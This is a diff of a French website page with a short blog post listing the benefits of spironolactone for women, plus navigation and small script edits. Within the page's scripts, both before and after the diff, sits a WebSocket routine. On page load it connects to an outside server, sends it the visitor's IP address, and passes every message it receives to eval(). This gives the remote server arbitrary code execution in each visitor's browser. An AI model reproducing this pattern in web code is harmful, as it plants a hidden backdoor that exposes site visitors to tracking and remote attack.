@@ -65,7 +65,7 @@
               <a class="nav-link" href="/fr/landing" title="Visitez la page de destination">Atterrissage</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Chat vidéo">Chat</a>
+              <a class="nav-link" href="/fr/chat" title="Chat vidéo">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/fr/private" title="Voir des photos privées avec une clé">Privé</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyPhoto de profil" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Par Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Quels sont les avantages de prendre la spironolactone en tant que femme? </p> <p> <br> </p> <p> spiro, ou spironolactone, est souvent prescrit aux femmes avec des déséquilibres hormonaux.Certains des avantages potentiels de la prise de spiro comprennent: </p> <p> <br> </p> <p> 1.Traitement de l'acné: Spiro peut aider à réduire l'acné en diminuant la production de sébum, ce qui peut obstruer les pores et entraîner des éruptions. </p> <p> <br> </p> <p> 2.Réduction de la croissance excessive des cheveux: Spiro peut aider à réduire la croissance excessive des cheveux, connue sous le nom d'hirsutisme, en bloquant les effets des hormones androgènes. </p> <p> <br> </p> <p> 3.Gestion des déséquilibres hormonaux: Spiro peut être utilisé pour gérer des conditions telles que le syndrome des ovaires polykystiques (SOPK) ou les déséquilibres hormonaux qui peuvent provoquer des irrégularités menstruelles ou d'autres symptômes. </p> <p> <br> </p> <p>4Traitement de l'hypertension artérielle: le spiro est un diurétique et peut aider à abaisser la pression artérielle en réduisant la quantité de sel et d'eau conservées dans le corps. </p> <div> <br> </div></div>
+<div style="white-space: pre-wrap;"><p>Quels sont les avantages de prendre la spironolactone en tant que femme?</p><p><br/></p><p>Spiro, ou spironolactone, est souvent prescrit aux femmes présentant des déséquilibres hormonaux. Certains des avantages potentiels de la prise de Spiro comprennent :</p><p><br/></p><p>1. Traitement de l'acné: Spiro peut aider à réduire l'acné en diminuant la production de sébum, ce qui peut obstruer les pores et entraîner des éruptions.</p><p><br/></p><p>2. Réduction de la croissance excessive des cheveux: Spiro peut aider à réduire la croissance excessive des cheveux, connue sous le nom d'hirsutisme, en bloquant les effets des hormones androgènes.</p><p><br/></p><p>3. Gestion des déséquilibres hormonaux: Spiro peut être utilisé pour gérer des conditions telles que le syndrome des ovaires polykystiques (SOPK) ou les déséquilibres hormonaux qui peuvent provoquer des irrégularités menstruelles ou d'autres symptômes.</p><p><br/></p><p>4. Traitement de l'hypertension artérielle: Spiro est un diurétique et peut aider à abaisser la pression artérielle en réduisant la quantité de sel et d'eau conservées dans le corps.</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
